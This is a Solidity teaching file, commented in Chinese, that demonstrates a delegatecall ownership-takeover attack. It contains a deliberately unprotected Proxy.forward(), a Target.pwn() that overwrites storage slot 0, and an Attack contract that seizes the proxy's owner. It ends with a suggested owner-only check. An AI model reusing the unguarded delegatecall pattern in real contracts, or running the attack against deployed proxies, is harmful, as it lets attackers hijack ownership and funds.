// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
攻击流程：
Attack合约的attack()函数通过 Proxy 合约的 forward() 方法，使用 delegatecall 调用 Target 合约的 pwn() 函数。
pwn() 函数会将 Proxy 合约的 owner 修改为 msg.sender（即 Attack 合约的地址）。
 */
contract Proxy {
    address public owner; // 设置owner

    constructor() {
        owner = msg.sender; //部署合约设置owner
    }

    function forward(address callee, bytes calldata _data) public {
        // 转发任何调用
        (bool success,) = callee.delegatecall(_data);
        require(success, "proxy error !!!");
    }
}

// 目标合约
contract Target {
    // 定义与代理合约一样的状态变量，并保证slot一致
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

/*/////////////////////////////////////////////
                   攻击合约  
/////////////////////////////////////////////*/
contract Attack {
    address public proxy;

    constructor(address _proxy) {
        proxy = _proxy;
    }

    function attack(address target) public {
        Proxy(proxy).forward(target, abi.encodeWithSignature("pwn()"));
    }
}

/*
修复建议：
为了避免这种攻击，可以在 Proxy 合约中添加权限检查，确保只有特定地址可以调用 forward 函数。例如：
 function forward(address callee, bytes calldata _data) public {
    require(msg.sender == owner, "Only owner can forward calls");
    (bool success,) = callee.delegatecall(_data);
    require(success, "Proxy error");
}
 
 */
